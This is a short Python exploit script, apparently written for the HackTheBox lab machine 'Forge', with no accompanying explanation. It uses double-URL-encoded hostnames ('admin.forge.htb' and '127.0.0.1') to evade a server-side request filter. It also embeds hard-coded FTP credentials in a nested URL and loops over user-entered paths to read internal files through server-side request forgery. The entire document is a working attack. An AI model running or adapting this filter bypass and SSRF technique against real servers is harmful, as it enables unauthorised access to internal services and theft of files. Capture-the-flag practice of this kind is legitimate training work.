#!/usr/bin/env python3

import requests
import re

url = 'http://forge.htb/upload'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
proxy = {'http':'http://localhost:8080'}

admin_forge = '%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%65%25%36%36%25%36%66%25%37%32%25%36%37%25%36%35%25%32%65%25%36%38%25%37%34%25%36%32'
localhost = '%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31'
upload = '/upload?u=ftp://user:heightofsecurity123!@'

while True:
    usr = input('PATH:> ')
    data = {'url': 'http://' + admin_forge + upload + localhost + usr, 'remote':'1'}
    req = requests.post(url, headers=headers, data=data, proxies=proxy)
    print(req.text)
